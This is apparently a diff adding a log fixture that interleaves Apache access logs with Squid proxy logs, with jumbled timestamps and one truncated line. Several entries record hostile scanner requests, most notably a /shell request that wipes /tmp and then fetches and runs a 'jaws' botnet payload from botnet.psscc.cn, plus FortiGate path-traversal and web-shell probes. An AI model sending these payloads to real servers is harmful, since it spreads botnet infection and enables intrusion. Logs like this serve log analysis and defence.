@@ -1,0 +1,318 @@
+198.98.59.132 - - [07/Sep/2022:00:01:07 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+156.204.213.149 - - [07/Sep/2022:00:48:09 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+197.51.39.122 - - [07/Sep/2022:00:52:47 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+180.149.125.173 - - [07/Sep/2022:01:18:57 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
+185.216.71.180 - - [07/Sep/2022:01:27:43 +0500] "GET / HTTP/1.1" 200 487 "-" "-"
+185.216.71.180 - - [07/Sep/2022:01:27:45 +0500] "POST /debug.cgi HTTP/1.1" 404 397 "-" "python-requests/2.21.0"
+197.55.153.158 - - [07/Sep/2022:01:41:46 +0500] "GET /shell?cd+/tmp;rm+-rf+*;wget+botnet.psscc.cn/jaws;sh+/tmp/jaws HTTP/1.1" 404 397 "-" "Hello, world"
+156.220.69.223 - - [07/Sep/2022:01:49:20 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+192.241.206.129 - - [07/Sep/2022:01:55:46 +0500] "GET /actuator/health HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /jindex.php HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /admin.php HTTP/1.1" 301 425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /xltavrat.php HTTP/1.1" 301 431 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /xleet.php HTTP/1.1" 301 425 "-" "Mozilla/5.0 (Linux; Android 10; Mi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /takeout.php HTTP/1.1" 301 429 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /xlet.php HTTP/1.1" 301 423 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /xleet-shell.php HTTP/1.1" 301 437 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:32 +0500] "GET /sh3llx.php HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:33 +0500] "GET /jindex.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:34 +0500] "GET /admin.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:35 +0500] "GET /xleet.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (Linux; Android 10; Mi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:36 +0500] "GET /takeout.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:37 +0500] "GET /xlet.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:37 +0500] "GET /xltavrat.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.81 Mobile Safari/537.36"
+104.131.124.34 - - [07/Sep/2022:01:57:37 +0500] "GET /xleet-shell.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"
+104.131.124.34 - - [07/Sep/2022:01:57:37 +0500] "GET /sh3llx.php HTTP/1.1" 404 4907 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
+::1 - - [07/Sep/2022:01:57:38 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+::1 - - [07/Sep/2022:01:57:39 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+::1 - - [07/Sep/2022:01:57:40 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+156.213.244.88 - - [07/Sep/2022:02:07:58 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+3.82.11.154 - - [07/Sep/2022:02:17:50 +0500] "GET / HTTP/1.1" 200 5187 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3010.80 Safari/537.32"
+103.221.235.116 - - [07/Sep/2022:02:29:34 +0500] "GET / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36"
+103.221.235.116 - - [07/Sep/2022:02:29:39 +0500] "GET / HTTP/1.1" 200 4972 "http://zp174.ru" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36"
+1662546102.931     53 192.168.13.128 TCP_REFRESH_MODIFIED/200 19872 GET http://7kas.sudrf.ru/themes/mobile/style/modules.css - HIER_DIRECT/84.42.111.139 text/css
+1662546102.939     62 192.168.13.128 TCP_REFRESH_MODIFIED/200 79712 GET http://7kas.sudrf.ru/themes/mobile/style/style.css - HIER_DIRECT/84.42.111.139 text/css
+152.89.196.62 - - [07/Sep/2022:06:31:18 +0500] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 384 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+65.49.20.66 - - [07/Sep/2022:06:45:31 +0500] "GET / HTTP/1.1" 200 5034 "-" "-"
+65.49.20.66 - - [07/Sep/2022:06:54:26 +0500] "GET /favicon.ico HTTP/1.1" 404 4888 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
+180.149.125.164 - - [07/Sep/2022:07:05:46 +0500] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 341 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
+162.220.165.123 - - [07/Sep/2022:07:12:52 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+35.92.131.50 - - [07/Sep/2022:07:13:07 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+54.148.158.228 - - [07/Sep/2022:07:17:01 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+18.236.153.120 - - [07/Sep/2022:07:20:47 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.89.104.100 - - [07/Sep/2022:07:20:56 +0500] "GET / HTTP/1.1" 301 407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.89.104.100 - - [07/Sep/2022:07:21:02 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.90.11.179 - - [07/Sep/2022:07:21:04 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.89.224.41 - - [07/Sep/2022:07:23:43 +0500] "GET /favicon.ico HTTP/1.1" 404 5080 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+34.210.186.203 - - [07/Sep/2022:07:24:13 +0500] "GET /favicon.ico HTTP/1.1" 404 5080 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+34.210.186.203 - - [07/Sep/2022:07:24:18 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+52.33.101.235 - - [07/Sep/2022:07:24:28 +0500] "GET / HTTP/1.1" 200 5104 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+143.92.32.175 - - [07/Sep/2022:07:24:39 +0500] "GET / HTTP/1.1" 200 5100 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html\xef\xbc\x89"
+54.213.209.40 - - [07/Sep/2022:07:27:32 +0500] "GET /favicon.ico HTTP/1.1" 301 429 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+54.213.209.40 - - [07/Sep/2022:07:27:33 +0500] "GET /favicon.ico HTTP/1.1" 404 5080 "http://zp174.ru/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+54.213.209.40 - - [07/Sep/2022:07:27:35 +0500] "GET / HTTP/1.1" 301 407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+54.213.209.40 - - [07/Sep/2022:07:27:36 +0500] "GET / HTTP/1.1" 200 5104 "http://zp174.ru" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.166.6.172 - - [07/Sep/2022:07:29:01 +0500] "GET /favicon.ico HTTP/1.1" 301 429 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.166.6.172 - - [07/Sep/2022:07:29:03 +0500] "GET /favicon.ico HTTP/1.1" 404 5080 "http://zp174.ru/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.166.6.172 - - [07/Sep/2022:07:29:03 +0500] "GET / HTTP/1.1" 301 407 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+35.166.6.172 - - [07/Sep/2022:07:29:04 +0500] "GET / HTTP/1.1" 200 5104 "http://zp174.ru" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
+87.250.224.12 - - [07/Sep/2022:07:34:12 +0500] "GET /robots.txt HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
+1662546102.866 120165 192.168.12.15 TCP_TUNNEL/200 1091 CONNECT 74.ru:443 - HIER_DIRECT/195.19.220.23 -
+1662546102.914     31 192.168.13.128 TCP_MISS/302 430 GET http://api-maps.yandex.ru/2.1/? - HIER_DIRECT/87.250.251.134 -
+1662546102.920     40 192.168.13.128 TCP_REFRESH_MODIFIED/200 14815 GET http://7kas.sudrf.ru/themes/mobile/style/jquery-ui.theme.min.css - HIER_DIRECT/84.42.111.139 text/css
+87.250.224.12 - - [07/Sep/2022:07:34:16 +0500] "GET / HTTP/1.1" 200 442 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
+2.57.122.98 - - [07/Sep/2022:07:48:53 +0500] "GET / HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+L/200 226 CONNECT static5.smi2.net:443 - HIER_DIRECT/88.212.234.55 -
+1662546102.111      0 192.168.15.15 TCP_DENIED/403 4020 CONNECT sync.rambler.ru:443 - HIER_NONE/- text/html
+1662546102.181  60109 192.168.12.95 TCP_TUNNEL/200 226 CONNECT static8.smi2.net:443 - HIER_DIRECT/88.212.252.76 -
+1662546102.436  87610 192.168.15.15 TCP_TUNNEL/200 3676 CONNECT bfds.sberbank.ru:443 - HIER_DIRECT/37.18.111.233 -
+3.68.105.241 - - [07/Sep/2022:18:29:31 +0500] "\x16\x03\x03\x01\x15\x01" 400 392 "-" "-"
+1662519038.742      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519038.749    140 192.168.6.220 TCP_REFRESH_MODIFIED/200 93846 GET http://7kas.sudrf.ru/themes/mobile/img/banner-lg_2022.jpg - HIER_DIRECT/84.42.111.139 image/jpeg
+1662519038.780     51 192.168.6.220 TCP_MISS/200 361 POST http://7kas.sudrf.ru/eedb7bf2c6bcd951f826bd2b93c95bbc - HIER_DIRECT/84.42.111.139 text/html
+1662519039.112     26 192.168.6.220 TCP_REFRESH_MODIFIED/200 7670 GET http://7kas.sudrf.ru/themes/mobile/img/favicon.ico - HIER_DIRECT/84.42.111.139 image/x-icon
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662546099.633      0 192.168.77.41 TCP_DENIED/403 3834 CONNECT gameplayapi.intel.com:443 - HIER_NONE/- text/html
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519039.743      0 192.168.6.220 NONE/000 0 NONE error:transaction-end-before-headers - HIER_NONE/- -
+1662519040.098      0 192.168.15.108 TCP_DENIED/403 3835 CONNECT gameplayapi.intel.com:443 - HIER_NONE/- text/html
+1662519040.947 240202 192.168.14.65 TCP_TUNNEL/200 6837 CONNECT optimizationguide-pa.googleapis.com:443 - HIER_DIRECT/74.125.205.95 -
+1662519041.228 240289 192.168.14.65 TCP_TUNNEL/200 281216 CONNECT optimizationguide-pa.googleapis.com:443 - HIER_DIRECT/74.125.205.95 -
+1662519041.459  66039 192.168.14.45 TCP_TUNNEL/200 4419 CONNECT kraken.rambler.ru:443 - HIER_DIRECT/81.19.89.17 -
+1662519042.239  15178 192.168.15.22 TCP_TUNNEL/200 5460 CONNECT consgd.consultant.ru:443 - HIER_DIRECT/194.105.131.16 -
+1662519044.574      0 192.168.77.43 TCP_DENIED/403 4080 CONNECT optimizationguide-pa.googleapis.com:443 - HIER_NONE/- text/html
+1662519047.816 289123 192.168.14.45 TCP_TUNNEL/200 7195 CONNECT ssl.gstatic.com:443 - HIER_DIRECT/142.251.1.94 -
+1662519052.036    293 192.168.15.94 TCP_TUNNEL/200 6344 CONNECT update.googleapis.com:443 - HIER_DIRECT/173.194.222.94 -
+101.35.161.133 - - [07/Sep/2022:18:38:10 +0500] "GET http://2.57.187.139:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 360 "-" "-"
+101.35.161.133 - - [07/Sep/2022:18:38:10 +0500] "GET http://2.57.187.139:80/pma/scripts/setup.php HTTP/1.0" 404 360 "-" "-"
+101.35.161.133 - - [07/Sep/2022:18:38:13 +0500] "GET http://2.57.187.139:80/db/scripts/setup.php HTTP/1.0" 404 360 "-" "-"
+101.35.161.133 - - [07/Sep/2022:18:38:26 +0500] "GET http://2.57.187.139:80/mysql/scripts/setup.php HTTP/1.0" 404 360 "-" "-"
+101.255.44.14 - - [07/Sep/2022:19:12:31 +0500] "GET / HTTP/1.1" 200 487 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+156.223.0.53 - - [07/Sep/2022:19:27:00 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+139.198.120.243 - - [07/Sep/2022:19:28:49 +0500] "GET / HTTP/1.1" 301 434 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+139.198.120.243 - - [07/Sep/2022:19:28:50 +0500] "GET / HTTP/1.1" 200 4917 "http://www.zp174.ru" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+66.249.76.248 - - [07/Sep/2022:19:31:54 +0500] "GET / HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+1662546097.641     51 192.168.13.128 TCP_MISS/200 361 POST http://7kas.sudrf.ru/eedb7bf2c6bcd951f826bd2b93c95bbc - HIER_DIRECT/84.42.111.139 text/html
+1662546097.689 240149 192.168.14.16 TCP_TUNNEL/200 1693 CONNECT clientservices.googleapis.com:443 - HIER_DIRECT/74.125.131.94 -
+1662546098.765     30 192.168.13.128 TCP_REFRESH_MODIFIED/200 14815 GET http://7kas.sudrf.ru/themes/mobile/style/jquery-ui.theme.min.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.765     30 192.168.13.128 TCP_REFRESH_MODIFIED/200 15821 GET http://7kas.sudrf.ru/themes/mobile/style/jquery-ui.structure.min.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.769     33 192.168.13.128 TCP_MISS/302 430 GET http://api-maps.yandex.ru/2.1/? - HIER_DIRECT/87.250.251.134 -
+1662546098.789     55 192.168.13.128 TCP_REFRESH_MODIFIED/200 19872 GET http://7kas.sudrf.ru/themes/mobile/style/modules.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.793     27 192.168.13.128 TCP_REFRESH_MODIFIED/200 3863 GET http://7kas.sudrf.ru/modules/sud_delo/css/style_portal_old.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.800     34 192.168.13.128 TCP_REFRESH_MODIFIED/200 1562 GET http://7kas.sudrf.ru/themes/mobile/style/jquery.ui.tabs.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.813     80 192.168.13.128 TCP_REFRESH_MODIFIED/200 79712 GET http://7kas.sudrf.ru/themes/mobile/style/style.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.816     81 192.168.13.128 TCP_REFRESH_MODIFIED/200 31985 GET http://7kas.sudrf.ru/themes/mobile/style/jquery-ui.min.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.817     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 5123 GET http://7kas.sudrf.ru/themes/mobile/JS/fancybox2/jquery.fancybox.css - HIER_DIRECT/84.42.111.139 text/css
+1662546098.836     32 192.168.13.128 TCP_REFRESH_MODIFIED/200 3343 GET http://7kas.sudrf.ru/modules/sud_delo/JS/sud_delo.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.855     35 192.168.13.128 TCP_REFRESH_MODIFIED/200 10353 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery-migrate-1.4.1.min.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.856     34 192.168.13.128 TCP_REFRESH_MODIFIED/200 1039 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery.watch.min.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.860     56 192.168.13.128 TCP_REFRESH_MODIFIED/200 22175 GET http://7kas.sudrf.ru/modules/sud_delo/JS/union2.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.869     30 192.168.13.128 TCP_REFRESH_MODIFIED/200 13647 GET http://7kas.sudrf.ru/themes/mobile/JS/date-picker.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.893     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 1110 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery.ui.datepicker-ru.min.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.899     31 192.168.13.128 TCP_REFRESH_MODIFIED/200 3436 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery.cookie.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.932     31 192.168.13.128 TCP_REFRESH_MODIFIED/200 967 GET http://7kas.sudrf.ru/themes/mobile/JS/info_show.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.951     52 192.168.13.128 TCP_REFRESH_MODIFIED/200 15766 GET http://7kas.sudrf.ru/themes/mobile/JS/main.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.971    100 192.168.13.128 TCP_REFRESH_MODIFIED/200 23484 GET http://7kas.sudrf.ru/themes/mobile/JS/fancybox2/jquery.fancybox.pack.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546098.976     40 192.168.13.128 TCP_REFRESH_MODIFIED/200 2135 GET http://7kas.sudrf.ru/themes/mobile/JS/xmlhttp.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546099.002    185 192.168.13.128 TCP_REFRESH_MODIFIED/200 97460 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery-1.12.4.min.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546099.031   1432 192.168.13.128 TCP_REFRESH_MODIFIED/200 224654 GET http://7kas.sudrf.ru/modules.php? - HIER_DIRECT/84.42.111.139 text/html
+1662546099.032     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 2962 GET http://7kas.sudrf.ru/themes/mobile/JS/ya_map.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546099.088     50 192.168.13.128 TCP_REFRESH_MODIFIED/200 18333 GET http://7kas.sudrf.ru/themes/mobile/img/gerb_rf.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.113    256 192.168.13.128 TCP_REFRESH_MODIFIED/200 255375 GET http://7kas.sudrf.ru/themes/mobile/JS/jquery-ui.min.js - HIER_DIRECT/84.42.111.139 application/javascript
+1662546099.117     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 416 GET http://7kas.sudrf.ru/modules/sud_delo/images/top_calc.gif - HIER_DIRECT/84.42.111.139 image/gif
+1662546099.144     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 376 GET http://7kas.sudrf.ru/modules/sud_delo/images/doSearch.gif - HIER_DIRECT/84.42.111.139 image/gif
+1662546099.146      0 192.168.13.128 TCP_DENIED/403 4013 CONNECT yastatic.net:443 - HIER_NONE/- text/html
+1662546099.160     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 668 GET http://7kas.sudrf.ru/images/print.gif - HIER_DIRECT/84.42.111.139 image/gif
+1662546099.176     29 192.168.13.128 TCP_REFRESH_MODIFIED/200 1396 GET http://7kas.sudrf.ru/themes/mobile/style/print.css - HIER_DIRECT/84.42.111.139 text/css
+1662546099.177     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 7643 GET http://7kas.sudrf.ru/themes/mobile/img/header-bg.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.179     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 1834 GET http://7kas.sudrf.ru/themes/mobile/img/lc.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.180     26 192.168.13.128 TCP_REFRESH_MODIFIED/200 334 GET http://7kas.sudrf.ru/themes/mobile/img/blink.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.181     30 192.168.13.128 TCP_REFRESH_MODIFIED/200 1924 GET http://7kas.sudrf.ru/themes/mobile/img/rc.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.193     27 192.168.13.128 TCP_REFRESH_MODIFIED/200 2815 GET http://7kas.sudrf.ru/themes/mobile/img/icon.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.208     27 192.168.13.128 TCP_REFRESH_MODIFIED/200 329 GET http://7kas.sudrf.ru/themes/mobile/img/menu-sep_vertical.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.208     29 192.168.13.128 TCP_REFRESH_MODIFIED/200 1538 GET http://7kas.sudrf.ru/themes/mobile/img/assist_ver.png - HIER_DIRECT/84.42.111.139 image/png
+1662546099.334    151 192.168.13.128 TCP_REFRESH_MODIFIED/200 93846 GET http://7kas.sudrf.ru/themes/mobile/img/banner-lg_2022.jpg - HIER_DIRECT/84.42.111.139 image/jpeg
+1662546099.381     65 192.168.13.128 TCP_MISS/200 2885 GET http://counter.sudrf.ru/cnt.php? - HIER_DIRECT/84.42.111.139 image/gif
+1662546099.390     65 192.168.13.128 TCP_MISS/200 458 GET http://7kas.sudrf.ru/fca40c75102a06d4d101ddd7d8284036.gif - HIER_DIRECT/84.42.111.139 image/gif
+1662546099.478     54 192.168.13.128 TCP_MISS/200 361 POST http://7kas.sudrf.ru/eedb7bf2c6bcd951f826bd2b93c95bbc - HIER_DIRECT/84.42.111.139 text/html
+192.241.197.66 - - [07/Sep/2022:07:51:24 +0500] "MGLNDD_2.57.187.139_80\n" 400 392 "-" "-"
+128.14.141.34 - - [07/Sep/2022:07:56:11 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+152.89.196.62 - - [07/Sep/2022:07:59:38 +0500] "GET /actuator/gateway/routes HTTP/1.1" 404 360 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+192.241.208.68 - - [07/Sep/2022:08:04:38 +0500] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4888 "-" "Mozilla/5.0 zgrab/0.x"
+162.221.192.26 - - [07/Sep/2022:08:06:15 +0500] "GET / HTTP/1.1" 200 4912 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+152.89.196.23 - - [07/Sep/2022:08:33:44 +0500] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 5111 "-" "Python-urllib/3.8"
+149.5.173.56 - - [07/Sep/2022:08:45:40 +0500] "GET login.cgi HTTP/1.1" 400 392 "-" "-"
